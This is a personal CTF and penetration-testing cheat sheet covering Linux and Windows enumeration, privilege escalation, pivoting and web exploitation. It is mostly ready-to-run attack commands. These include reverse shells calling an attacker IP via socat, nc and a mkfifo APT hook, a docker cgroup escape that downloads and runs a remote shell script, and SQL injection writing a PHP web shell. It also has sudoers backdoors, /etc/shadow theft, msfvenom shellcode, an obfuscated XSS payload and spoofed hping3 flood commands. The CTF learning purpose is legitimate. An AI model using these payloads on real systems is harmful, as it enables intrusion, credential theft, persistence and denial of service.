## I used to forget stuff when doing CTF and things. I build these notes little by little to help me remember things I failed to remember. This note doesn't contain everything. Nevertheless, I hope it can be useful. 



## HolyBible
- Linux
https://gtfobins.github.io/
- Windows 
https://lolbas-project.github.io/
https://misakikata.github.io/2019/10/Windows-Notes/
- General
https://book.hacktricks.xyz/


Dont forget to play with top level module in python. Ex:
__import__("os").system("ls")


**Box Notes**
1. Always check /etc/sudoers.d
2. Always check /etc/crontab or cd to /etc/cron.d
but dont trust /etc/crontab >:(
3. Always check version, kernel release, and stuff
```
cat /etc/*release
uname -a 
cat /etc/issue 
```
5. find / -perm -u=s -type f 2>/dev/null >>> to find some suid misconf
6. find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null
7. find / -user root -perm -4000 -print 2>/dev/null
8. find / -type f -perm -04000 -ls 2>/dev/null (same like -u=s)
9. **find / -user <username> 2>/dev/null | grep -v '^/proc\|^/run\|^/sys'**  (INI BUAT EXCLUDE PROC RUN DAN SYS FOLDER)

**Append this to all find command, you are good | grep -v '^/proc\|^/run\|^/sys'**

10. IF there's motd.d executed once connected, always check the permission of the /etc/motd.d see if u can write on it

11. when u got privesc thing just 
- http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet or
- `chmod u+s /bin/bash` as root, bash -p, or 
- `echo "samantha ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers;`

and on and on and on

12. linpeas linenum pspy name ur shits
13. Always check `cat ~/.*history | less` or just `history`
14. Use ysoserial to exploit java deserialization to get revershell or RCE (payload have to be in a file). Then use it or encode it first, what ever.
15. `.conf` file may contain something. (usually in /etc/apache2)
16. Stuck? Bruteforce with no end? Generate your own wordlist with cewl! Example: cewl http://10.10.10.191/ -w customwordlist.txt -m 6
17. 
- SMB enum >>> smbclient -L //[IP](its_the_same_like_--list=[IP]), and continue with the shares name `smbclient //[IP]/[sharename]`
- Just `smbclient -h` tbh
18. rpcclient --user=[username] [target-ip] -W [forest name]
19. Check cdata
20. Port 11211 is memcached server >>> https://www.hackingarticles.in/penetration-testing-on-memcached-server/
21. Always check `netstat -tulpn` or `ss -tulpn` and `ps aux`
- Forward the unusual service and check it like 445 SMB or HTTP or FTP service.
22. Enum smtp with telnet.
23. On windows, always check `whoami /priv` and find recent vulnerability.
24. Always check .git, and dont forget to use gitdumper.
25. Keep an eye for exposed docker API port 2375 or 2376
26. No gcc? search for cc

27. DONT FORGET BLIND COMMAND INJECTION (pipe the injection with nc to see the result)
ex: asdasd;ls -la | nc 10.8.102.36 1234

28. Check for .htpasswd in LFI (/etc/apache2/.htpasswd or in other locations)


## list shares
`smbclient -L //[IP]`

## try anonymous login
`smbclient -N //[IP]/[sharename]`

## try null authentication
`smclient -U '' -N //[IP]/sharename`

## try with rpcclient (when got in just google rpcclient commands)
`rpcclient [ip]`

## try with rpcclient with null authentication
`rpcclient -U '' -N [IP]`



 
**GPG**
https://linux.101hacks.com/unix/gpg-command-examples/
Example to encrypt:
1. gpg --import [public_key]
2. gpg --recipient [user will be recieving] --encrypt [file_name]
3. The output shouldbe [file_name].gpg
Example to decrypt:
1. gpg --import [private_key]
2. gpg [file_name]
or
1. gpg --decrypt [file_name]


**CVE-2019-13287**
(ALL, !root) /bin/bash >>> sudo -u#-1 /bin/bash



**OpenSSL**
1. Decrypt RSA
openssl id_rsa -in=id_rsa



**Capabilities**
https://www.hackingarticles.in/linux-privilege-escalation-using-capabilities/

1. The way capabilities work is like SUID. It allows us to execute some function as root. Always check capabilities >>> getcap -r / 2>/dev/null
Keep an eye on cap_setuid+ep or setuid capabilities mostly.

## `/usr/bin/python3 = cap_setuid+ep`
We can just exploit that like `/usr/bin/python3 -c 'import os; os.setuid(0); os.system("/bin/bash")`

## `/usr/bin/perl = cap_setuid+ep`
Same like python, we can just do this `/usr/bin/perl -e 'use POSIX (setuid); POSIX::setuid(0); exec "/bin/bash";'`

## `/usr/bin/openssl = cap_setuid+ep`
We can create our own OpenSSL engine in C (<openssl/engine.h>), and use the SETUID capabilities (<unistd.h>)
Use the `openssl_setuid.c`

## `/usr/bin/tar = cap_dac_read_search+ep`
In short, we can use tar as root, so we can:
- tar the shadow > `/usr/bin/tar cvf shadow.tar /etc/shadow`
- extract the tar > `/usr/bin/tar xvf shadow.tar`
- see the inside > `cat etc/shadow`



**Reverse Shell**
IF TRADITIONAL REVERSE SHELL DOESN'T WORK, USE SOCAT ONE!
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md
Ex:
1. Download the socat binary: wget https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat
2. Open a socat listener: socat file:`tty`,raw,echo=0 TCP-L:1234
3. Open a server to let the target download the socat: python3 -m http.server
4. Execute the RCE: wget -q 10.8.102.36:8000/socat -O /tmp/socat; chmod +x /tmp/socat; /tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.8.102.36:1234



**Gdbuss Root SSH Privesc**
1. gdbus call --system --dest com.ubuntu.USBCreator --object-path /com/ubuntu/USBCreator --method com.ubuntu.USBCreator.Image /root/.ssh/id_rsa /tmp/root_rsa true
https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/



**Chisel**
Essentially port forwarding services (http, ftp, smb, dll).
- If there's an attempt to SSH or something outside the docker container we are in and we cant access it. We need to socks proxy stuff it somehow.
- If we are trapped inside a docker container.

./chisel server --help
./chisel client --help

On our machine:
1. `sudo ~/tools/chisel server -p [Anyport] --reverse`

On the target Machine:
2. Transfer the chisel client
3. chmod +x chisel
4. ./chisel client [Our IP]:[Our Port] R:[The port you going to access from your server (Anything)]:[The IP we want to proxy]:[The Service port we want to proxy]
R:<local-interface>:<local-port>:<remote-host>:<remote-port>/<protocol>
IF error, or stuff, just remove the local interface
5. ss -ltn | grep -i [service port], if the service port available, you have succeed.
6. You can now use the service locally.
Ex: http://10.8.102.36:8080/ >> Our ip and the service port we want to proxy



**PortForward**
If you already have access to the target SSH server.
1. `sudo ssh -L [service_port]:localhost:[service_port] [user]@[target_ip]`
Example:
- Portforwarding SMB: `sudo ssh -L 445:localhost:445 yanto@69.69.69.69 -i id_rsa`



**Public to Local**
1. ngrok OP, fuck vps
2. Download and register
3. ngrok [service] [port]

example:
sudo nc -lnvp 1234
ngrok tcp 1234

4. Host a web server public? ngrok http 80



**Socat**
- If there's specific service open like SSH or something, but portforwarding it doesnt work. You need to fork it.
- Example case is like SSH service running locally.
- Use netstat or ss -tulpn to check the service running.
- With socat its like you are opening the service on the different port. (Like, previously not open SSH service [only run locally], you open it but on another port)
- check `/etc/ssh/sshd_config` for the SSH details.

On the target machine:
==== If the target doesnt have socat, just download it from https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat then transfer it.

1. socat tcp-listen:[Anyport],reuseaddr,fork tcp:[The_service_IP]:[Service_pirt]
Ex: socat tcp-listen:9999,reuseaddr,fork tcp:localhost:22

ref: https://stackoverflow.com/questions/31193485/combining-socat-with-ssh-to-have-dynamic-port-forwarding-through-socks-proxy

2. Now the service is open and you can access it
Ex: ssh fox@[target-ip] -p 9999



**DNS** 
https://linux.die.net/man/8/nsupdate
1. Adding zone
nsupdate -k [the key file]``(should be in /etc/bind)``
`update add [domain_name] 86400 A [your IP]`
`update add [yourIPreversed].in-addr-arpa 300 PTR [domain name]`

Example:
nsupdate -k infra.key
update add nonox.infra.dyna.htb 86400 A 10.10.14.200
<enter>
update add 200.14.10.10.in-addr-arpa 300 PTR nonox.infra.dyna.htb
send



**SNMP 161**
The Simple Network Management Protocol
1. Find the community string
`onesixtyone <Target-IP> -c ~/wordlists/SecLists/Discovery/SNMP/snmp-onesixtyone.txt -o snmp.log`
Example result:
10.10.153.204 [openview] Hardware: Intel64 Family 6 Model 63 Stepping 2 AT/AT COMPATIBLE - Software: Windows Version 6.3 (Build 17763 Multiprocessor Free)
"openview" is the community string

2. With community string, we can access SNMP Server.
Automatic: 
snmp-check <Target-IP> -c [Community String]

Manual:
>>> Default location of the username list is: 1.3.6.1.4.1.77.1.2.25
snmpwalk <Target-IP> -c [Community String] -v1 1.3.6.1.4.1.77.1.2.25



**Port Knocking**
- No port, open seems weird?
1. sudo apt-get install knockd
2. knock [ip] [port]
ex: knock 10.10.225.87 21 22 8080
3. Just script it to knock all port and do nmap again.



**LOGS**
1. Always check /var/log/auth.log
2. Always check /var/log/apache2/access.log



**Internal**
1. Fast internal network scan
ex: curl http://[IP]:[Port range with the brackets]
- curl http://10.10.11.88:[0-65353]



**RCE**
- PHP json_decode() case. (not guaranteed tbh)
Ex:
"search":"\";[command];echo \""



**LXD**
1. git clone  https://github.com/saghul/lxd-alpine-builder.git
2. cd lxd-alpine-builder
3. ./build-alpine
4. transfer the alpine tar.gz
On the target machine
5. lxc image import ./[alpine file] --alias hello
6. lxc image list >> see our image
7. lxc init hello ignite -c security.privileged=true
8. lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true
9. lxc start ignite
10. lxc exec ignite /bin/sh



**Symbolic Link**
Allow us to create a link between file, its like the same file but in two places.
https://linuxize.com/post/how-to-create-symbolic-links-in-linux-using-the-ln-command/
ln -s [file_we_want_to_link] [the_symbolic_link]
ex: ln -s /etc/shadow /home/yanto/xxx.txt



**CVE-2015-5602 (SUDOEDIT)**
https://www.exploit-db.com/exploits/37710

This affect sudo version <= 1.8.14
To check sudo version: sudo --version

sudoedit /*/*/

Example case:
(ALL : ALL) sudoedit /var/www/html/*/*/config.php
What should we do?
1. mkdir -p /var/www/html/tmp1/tmp2/   >>> Create the directory, because of the wildcard we can create anything
2. ln -s /etc/shadow /var/www/html/tmp1/tmp2/config.php >>> Symbolic link the root owned file we want to edit
3. sudoedit -u root /var/www/html/*/*/config.php >>> Run it
4. Now we can edit /etc/shadow 


**APT privesc**
https://www.hackingarticles.in/linux-for-pentester-apt-privilege-escalation/
1. `echo 'apt::Update::Pre-Invoke {“rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc KALI_IP 1234 >/tmp/f”};’ > pwn`


**Wild card privesc**
### When there's a script using `*`, for example to backup stuff. Usually in cronjob.
Example: 
In a cronjob there's 
`/usr/local/bin/backup.sh` with this inside it
```
cd /home/user
tar czf /tmp/backup.tar.gz *
```
We can exploit that function to execute all the script in the directory (in this case /home/user) to escalate our privilege
1. Create a script file in the /home/user for example
echo "chmod +s /bin/bash" > exploit.sh
2. touch /home/user/--checkpoint=1
3. touch /home/user/--checkpoint-action=exec=sh\ exploit.sh
4. Because of the wild card being used, the --checkpoint=1 and --checkpoint-action=exec=sh\ exploit.sh will actually be included in the tar command, resulting our exploit.sh to be executed

tar --checkpoint=1 --checkpoint-action=exec=sh exploit.sh >> Like this


**JABBER 5222**
1. Spark(?)
2. https://github.com/theart42/cves/blob/master/cve-2020-12772/CVE-2020-12772.md



**NFS2049**
1. showmount -e <remote-ip>
2. sudo mkdir /mnt/[name_of_the_mount]
3. sudo mount <remote-ip>:[shared_directory] /mnt/[name_of_the_mount]
===
If there's NFS Service running but u cant remote. Very likely it will be used in privesc and not foothold
1. Check `cat /etc/exports` (if rw, root_squash flag enabled on the shared directory), you can mount it to your local machine
2. sudo mkdir /mnt/[name_of_the_mounts]; sudo mount -t nfs <remote-ip>:<shared_directory> /mnt/[name_of_the_mount] 
3. Now you can access the directory locally.
4. If permission is denied when accessing, create a user with the same name, same UID, and same GID, as the owner of the share. (to create the same environment)
```
sudo useradd -u [id] -d [home_directory, /dev/shm atau tmp aja sih] [username]
to delete it
sudo userdel -r [username]
```
5. sudo su to the user and now you can access it. 
===
IMPORTANT NOTES
1. When you do this 
`sudo mount -t nfs <remote-ip>:<shared_directory> /mnt/[name_of_the_mount]` or 
`sudo mount <remote-ip>:[shared_directory] /mnt/[name_of_the_mount]` (Its the same btw)

IF YOU GET AN ERROR, LIKE THIS:

`mount.nfs: requested NFS version or transport protocol is not supported`

TRY TO CHANGE THE SHARED DIRECTORY TO / 
example: localhost:/

2. WHY? It's on the Redhat documentation I forgot where. I spent like 6 hours researching to fix this error, and the fix is just simply change the shared directory part to /.

https://book.hacktricks.xyz/linux-unix/privilege-escalation/nfs-no_root_squash-misconfiguration-pe
You can use that for privilege escalation as shown in this link.



**RSYNC873**
Basically rsync allow us to sync remote directory to our local directory so we can access it locally. Same like NFS.

## To Sync file or directory perhaps
1. rsync -av --list-only rsync://[IP]
--list-only to list sync file
-v verbose
-a archive mode

Archive mode
preserves time stamps, performs a recursive copy, keeps all file and directory permissions, preserves owner and group information, and copies any symbolic links

2. rsync rsync://[user]@[ip]/[the_sync_file]
3. mkdir [dir_name]
4. rsync -av rsync://[user]@[ip]/[the_sync_file] [dir_name_you want to place the sync folder with] 

## To Transfer file
1. rsync -av [filename] rsync://[user]@[ip]/[the_location_u_want_to_put_it]
ex: rsync -av authorized_keys rsync://rsync-connect@10.10.119.109/files/sys-internal/.ssh/authorized_keys



**cURL**
You can actually access services other than HTTP using curl
ex for accessing FTP service:
1. curl 'ftp://[username]:[password]@[target_ip]/' -v -P -

You can even upload file to the target!
ex for uploading file to FTP service:
1. curl 'ftp://[username]:[password]@[target_ip]/files/' -v -P - -T  rev.sh



**GIT**
Usual git command for CTF
1. git checkout .
2. git revert []
3. git log
4. git show [] or git diff [] or else to see commit
5. just man git tbh


**Impacket**
1. GetNPUsers.py >> This script can check of the usernames are existing and if they have Kerberos pre-authentication enabled

Usage: `python3 ~/scripts/impacket/examples/GetNPUsers.py [Forest]/ -usersfile [List of username file] -outputfile hash.txt -dc-ip [TARGET IP] -format john` >> format john so then u can crack the existing user hash

2. secretsdump.py >> Performs various techniques to dump hashes from the remote machine without executing any agent there. (SAMHashes, LSASecrets, NTDSHashes)

Example: 
`python3 ~/scripts/impacket/examples/secretsdump.py -ntds ntds.dit -system system.bak LOCAL`
`~/scripts/impacket/examples/secretsdump.py -just-dc-ntlm <DOMAIN>/<USER>@<DOMAIN_CONTROLLER>`
and many more.. go research on it.

[] >>> means optional command



**PATH Privesc**
### When it is not run directly, example:
## IF THERE'S A SECURE PATH, USE THE SECURE PATH DIRECTORY. IT DOESN'T ALWAYS HAVE TO BE ON /tmp or /dev/shm
/usr/bin/cat >>> cant
cat >>> can
1. cd /tmp
2. echo "/bin/bash" > [the misconfigured]
3. chmod +x [the misconfigured]
4. export PATH=/tmp:$PATH
5. Execute the misconfigured binary

# In Bash versions < 4.2-048 it is possible to define shell functions with names that resemble file paths, then export those functions so that they are used instead of any actual executable at that file path.
/usr/sbin/service >>> can
1. function /usr/sbin/service { /bin/bash -p; }
2. export -f /usr/sbin/service
3. Execute the misconfigured binary

### Does not have to be in /tmp, u can create your own folder



**How to create environment variable**
1. export [varname]=[value]
2. echo $[varname]



**XSS**
1. <detail/open/ontoggle=alert()>
2. 𒀀='',𒉺=!𒀀+𒀀,𒀃=!𒉺+𒀀,𒇺=𒀀+{},𒌐=𒉺[𒀀++],
𒀟=𒉺[𒈫=𒀀],𒀆=++𒈫+𒀀,𒁹=𒇺[𒈫+𒀆],𒉺[𒁹+=𒇺[𒀀]
+(𒉺.𒀃+𒇺)[𒀀]+𒀃[𒀆]+𒌐+𒀟+𒉺[𒈫]+𒁹+𒌐+𒇺[𒀀]
+𒀟][𒁹](𒀃[𒀀]+𒀃[𒈫]+𒉺[𒀆]+𒀟+𒌐+"(𒀀)")()

https://aem1k.com/aurebesh.js/#%3Cscript%3Eak

3. ..
4. U can use this to bypass filter https://www.web2generators.com/html-based-tools/online-html-entities-encoder-and-decoder


**Little SQLI**
1. 'UNION SELECT 1,table_name,column_name FROM information_schema.columns -- -
2. 'UNION SELECT 1,group_concat(sql),3 FROM sqlite_master -- -
3. 'UNION SELECT 1,group_concat(schema_name),3,4 from information_schema.schemata -- - (get list of databases)
4. 'UNION SELECT group_concat(column_name),group_concat(table_name),3,4 from information_schema.columns WHERE table_schema='[db_name]'-- -

IF the setting allowed, we can write file
Usually We hex encode the payload

<?php system($_GET[‘cmd’]); ?>
to
0x201c3c3f7068702073797374656d28245f4745545b2018636d6420195d293b203f3e201d

1. `' UNION SELECT 1,0x201c3c3f7068702073797374656d28245f4745545b2018636d6420195d293b203f3e201d INTO OUTFILE '/var/www/html/cmd.php' -- -`
2. `<original_value>' 0x201c3c3f7068702073797374656d28245f4745545b2018636d6420195d293b203f3e201d INTO OUTFILE '/var/www/html/cmd.php' -- -`

IF None work
1. <original_value>' INTO OUTFILE '/var/www/html/cmd.php' LINES TERMINATED BY [Any,terminator, usually the hex encoded RCE code] -- -
Ex:
288cc16ac43351ff676132e9fd7c6ef3' INTO OUTFILE '/var/www/html/cmd.php' LINES TERMINATED BY 3C3F7068702073797374656D28245F4745545B27636D64275D293B3F3E -- -

Trueing
1. Dont just do `' or 1=1 -- - `
2. Try ' or '1' = '1  >> This should return true too
ex: 
where username = ''
where username = '' or '1' = '1' 



**Bufferoverflow**

## Peda https://myexperiments.io/exploit-basic-buffer-overflow.html
1. i func
find the function address we want to jump to
2. gdb [binary]
3. pattern create [value]
4. run '[the pattern]'
see the EIP value
5. pattern offset [EIP value]
we got the exact overflow value
6. python -c "print 'A' * [exact_value] + '[target address]'"
target address usually little endian
ex: 0x80484c6 >>>> \xc6\x84\x04\x08

## Using msf-pattern and BOP usual case
1. Predict the size
2. msf-pattern_create.rb -l [the size] >>> we got the address
3. msf-pattern_offset.rb -l [the size] -q [the EIP value] >>> we got the exact overflow value
4. Find badchars (missing hex from the badchars list) >>> payload + badchars
5. Find unprotected module, use `!mona modules` or smth
6. Find jmp pointer (ESP) on unprotected module, use `!mona find -s "\xff\xe4" -m [unprotected dll or exe]`
7. Got the ESP address, change it to little endian format
ex: 0x080414C3 >>> \xC3\x14\x04\x08
8. Overwrite the EIP with the little endian ESP address
9. Generate shellcode with the badchars >>> overwrite with shellcode to gain remote access
Example:
msfvenom -p windows/shell_reverse_tcp LHOST=[yourip] LPORT=[yourport] EXITFUNC=thread -f c -a x86 -b "\x00"

encode it with shikata_ga_nai if u want
-f >>> the output file language
-a >>> the architecture
-b >>> bad chars

10. Dont forget to add NOPS (\x90) on final payload ('\x90' * 32 or more or less).
11. Final payload formation: [Payload] + [ESP] + [NOPS] + [SHELLCODE]
Example:
`payload = b"A"*146 + b"\xC3\x14\x04\x08" + b"\x90" * 20 + shellcode`



**Fix your terminal**
1. python3 -c 'import pty;pty.spawn("/bin/bash");'
2. export TERM=xterm >>> so you can clear
3. ctrl + z >>> background
4. stty raw -echo
5. fg



**CTF Tools**
1. Forensics >> exiftool, volatility, zsteg, stegsolve, stegcracker, steghide
2. Way Back Machine can see everything, not only dead websites



**SSH with id_rsa**
1. chmod 600 id_rsa >>> for ours and ours alone 
2. ssh -i id_rsa [user]@[ip]



**Dorking**
1. Possible SQLi target >>> inurl:"product.php?id=" & intext:"You have an error in your SQL syntax"
2. Open FTP >>> "intitle: index of" inurl:ftp



**ARP**
Enable port forwarding
## echo 1 > /proc/sys/net/ipv4/ip_forward
### Poisoning
1. sudo arpspoof -i [interface] -t [target_ip] [gateway_ip]
2. sudo arpspoof -i [interface] -t [gateway] [target_ip]
Or just langsung pake -r (both direction)
1. sudo arpspoof -i [interface] -t [target_ip] -r [gateway_ip]

### Sniff
1. After poisoning, sniff packets with wireshark
2. Or just use bettercap and do this all automaticly tbh.



**Wireshark**
1. [FILTER] && [FILTER] && [FILTER] >>> Filtering stuff
Ex: ip.src == [IP] && http 
2. Follow the stream~



**Crunch**
## Generate wordlists with Crunch
Ex: 
Default charset is lowecase alphabet
- crunch [min-length] [max-lenth] ([charset] [option]) >>> optional
- crunch 2 4
- crunch 1 2 soni siu sia >>> min and max length is required but in this case wont be used.
- crunch 6 6 -t d%d%d% -p rara riri ruru >> d is the word location. The length will be more than 6. When we use -p length is just a formality/
- etc.. just read the man

## Important Options

Pattern (-t)
@ -> lowercase character
, -> uppercase character
% -> numbers
^ -> symbol
- crunch 7 7 -t @,%^123 -o wordlist.txt (notice that min-max length have to be the same as pattern length)

Charset (-f)
- Lookat the preset charsets in /usr/share/crunch/charset.lst
- crunch 2 5 -f /usr/share/crunch/charset.lst mixalpha-numeric-all -o ww.txt


**Instant Docker Escape**
Create a reverse shell.sh
Open a netcat listener to get connection from shell.sh and a python server ofc

On the docker machine
1. mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
2. echo 1 > /tmp/cgrp/x/notify_on_release
3. host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
4. echo "$host_path/cmd" > /tmp/cgrp/release_agent
5. echo '#!/bin/sh' > /cmd
6. echo 'curl [yourIP]:8000/shell.sh -o /dev/shm/shell.sh' >> /cmd
7. echo 'chmod +x /dev/shm/shell.sh' >> /cmd
8. echo 'sh /dev/shm/shell.sh' >> /cmd
9. chmod a+x /cmd
10. sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"

===========

1. You can use the gtfo bins one also to create alpine
2. Or just use some weird misconfiguration on the system.


**Random**
1. hashcat --example-hash >> or just visit the one in the web
<hash>:<salt>
2. diff -y [file1] [file2] >> compare file side by side
3. binary mode FTP is better
4. watch -n 0 [stuff you want to watch]
ex = watch -n 0 ls -la /bin/bash
5. when we have admin in windows, and meterpreter shell, try
	`run post/windows/manage/enable_rdp `
	and conenct rdp. Fun commands
6. Veil msfconsole combo
Generate
msfconsole --resource /var/lib/veil/output/handlers/[yourbackdoor]
7. nc -e /bin/bash [ip] [port]
8. from binascii import unhexlify >> unhexlify to convert hex to string
9. hping3 DOS
	hping3 -S [host] -p ++[initial_port] >>> Port status discovery (open/not)
	hping3 -S [host] -p [port] -a [disguised_host] --flood
	hping3 -S [host] -p [port] -a [disguised_host] --flood --rand-source

	example: sudo hping3 -S 45.33.32.156 -p 80 -a 173.203.36.104 --flood --rand-source -V >>> -V for verbose
10. alias cd='rm -rf' >> LOL DONT DO THIS
11. ping and look at the TTL to find the target OS.
12. Rsa stuff
```
Public Key Pair: (23, 37627)                                                                          
Private Key Pair: (61527, 37627)

Public Key: ({e}, {n})
Private Key: ({d}, {n})

e = 23
d = 61527
n = 37627
```
13. Colorful RGB image squares? PIET 
14. Bruteforcing takes too long? try to reverse the wordlist using `tac`
Usage: tac wordlist | tee reversed_wordlist


**OSINT**
1. Twitter is your friend
2. Wayback machine is a thing
3. Just use frickin sherlock if you have a username >>> python3 sherlock/ `username`
https://whatsmyname.app/
https://namecheckup.com/
https://namechk.com/
https://scylla.sh/api (Breach database) (ex = email:rudolphthered@hotmail.com, password:spygame, [what to search]:[the data])



**Python Jail Escape**
https://anee.me/escaping-python-jails-849c65cf306e
Python allows us to use built in objects using the __builtins__ module.
__dict__ >> convert to dictionary representation so it's easier to access.

Example:
__builtins__.__dict__['__IMPORT__'.lower()]('OS'.lower()).__dict__['SYSTEM'.lower()]('/bin/bash')



**LIST OF JSON PARSE VULNERABILITY**
1. https://labs.bishopfox.com/tech-blog/an-exploration-of-json-interoperability-vulnerabilities



**Node JS**
1. this
2. .toString() >>> Look at function body, literally looks what inside the function.



**Tricks**
1. [command name]() { cd "$@" && ls; } >> Auto ls when cd
ex:
cdls(){ cd "$@" && ls; }
i prefer just c
2. .bashrc is the file that's executed first when you logged in to SSH, to login without activiting it do 
`ssh -t [username]@[ip] /bin/sh`
3. Automatc meterpreter persistance
https://www.offensive-security.com/metasploit-unleashed/meterpreter-service/
4. PYTHONPATH or PYTHONENV is the python environment variable, SO IF WE CHANGE IT THE IMPORT LOCATION ALSO CHANGES
5. Statically linked binary is OP. U can use for example statically linked nmap to scan internal network to Pivot to other network. Useful when you are trapped inside a docker and tools are very limited.
6. Bypass 403 with 403 fuzzer.
7. File inside a folder but we dont own it and have no permission to write or edit it? If it's inside folder that we owned (example our home folder) we can, delete it. If there's a cronjob, we can just delete it and create malicious file with the same name.
8. X-Forwarded-For: 127.0.0.1 Can be used to access a network internally
9. Use 443 or 80 for revshell if other port doesnt work.
10. /dev/shm is a shared memory directory.
11. Find VULNERABLE UN-UPDATED SOFTWARE >> apt list --upgradeable (snapd or sudo perhaps)
12. You can spawn TTY to stabilize shell with typescript (/usr/bin/script).
- This is useful in a very limited docker env
ex: /usr/bin/script -qc /bin/bash /dev/null

13. cat /proc/net/route to see if other network available.